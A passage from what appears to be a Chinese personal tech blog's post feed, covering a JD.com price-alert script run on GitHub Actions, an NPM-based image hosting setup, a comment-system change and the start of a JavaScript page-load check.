lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span 